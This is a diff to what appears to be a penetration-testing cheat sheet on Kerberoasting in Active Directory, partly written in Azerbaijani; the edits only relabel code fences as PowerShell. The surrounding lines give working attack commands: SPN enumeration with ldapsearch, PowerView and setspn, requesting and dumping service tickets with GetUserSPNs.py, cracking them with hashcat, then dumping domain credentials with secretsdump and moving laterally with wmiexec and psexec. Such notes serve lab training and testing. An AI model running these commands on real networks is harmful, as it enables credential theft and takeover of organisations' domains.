@@ -2,7 +2,7 @@
 
 ### Linux
 
-```
+```powershell
 ============ From Linux ============
 # LDAP Query
 ldapsearch -x -h dc-ip -b "DC=domain,DC=com" "(servicePrincipalName=*)" servicePrincipalName sAMAccountName memberOf
@@ -20,7 +20,7 @@ secretsdump.py -just-dc domain/admin@dc-ip
 ```
 
 ### Windows
-```
+```powershell
 ============ From Windows ============
 # SPN Users
 Import-Module .\PowerView.ps1
@@ -37,7 +37,7 @@ setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % 
 ```
 
 ### Toolsuz Kerberoasting
-```
+```powershell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 
@@ -69,7 +69,7 @@ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
 
 ## Attack Vector
 
-```
+```powershell
 # TGS Request və Dump
 GetUserSPNs.py -request -dc-ip dc-ip 'domain\user:password' -target-user svc-sql -outputfile roast.txt
 
@@ -88,9 +88,9 @@ cme smb dc-ip -u user -p pass -M kerberoast
 
 ## Post Exploitation
 
-```
+```powershell
 secretsdump.py 'domain/svc-sql:crackedpass'@dc-ip -just-dc-user admin
 
 wmiexec.py 'domain/svc-sql:crackedpass'@target-server
 psexec.py 'domain/svc-sql:crackedpass'@target-server
-
+```
